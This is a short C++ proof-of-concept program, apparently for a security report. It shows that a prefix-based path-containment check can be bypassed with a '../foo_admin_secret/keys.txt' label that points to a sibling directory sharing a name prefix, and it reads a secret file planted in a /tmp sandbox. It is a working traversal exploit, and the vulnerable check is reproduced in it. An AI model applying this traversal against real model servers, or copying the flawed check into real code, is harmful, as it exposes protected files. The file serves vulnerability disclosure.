#include <filesystem>
#include <fstream>
#include <iostream>
#include <string>

bool
IsChildPathEscapingParentPath_ORIG(
    const std::string& child_path, const std::string& parent_path)
{
  std::string absolute_child_path =
      std::filesystem::weakly_canonical(child_path).string();
  std::string absolute_parent_path =
      std::filesystem::canonical(parent_path).string();
  return absolute_child_path.rfind(absolute_parent_path, 0) != 0;
}

int main() {
  std::filesystem::remove_all("/tmp/triton_poc");
  std::filesystem::create_directories("/tmp/triton_poc/models/foo");
  std::filesystem::create_directories("/tmp/triton_poc/models/foo_admin_secret");
  std::ofstream("/tmp/triton_poc/models/foo_admin_secret/keys.txt") << "SECRET_ADMIN_MATERIAL";

  std::string parent = "/tmp/triton_poc/models/foo";
  std::string attacker_label = "../foo_admin_secret/keys.txt";
  std::string joined = parent + "/" + attacker_label;

  bool escaped = IsChildPathEscapingParentPath_ORIG(joined, parent);
  std::cout << "Joined:    " << joined << "\n";
  std::cout << "Child can: " << std::filesystem::weakly_canonical(joined).string() << "\n";
  std::cout << "Parent can:" << std::filesystem::canonical(parent).string() << "\n";
  std::cout << "is_escaped (should be TRUE to block): " << (escaped ? "true" : "FALSE=BYPASS") << "\n\n";

  std::ifstream f(joined);
  std::string content; std::getline(f, content);
  std::cout << "Leaked content: " << content << "\n";
  return 0;
}
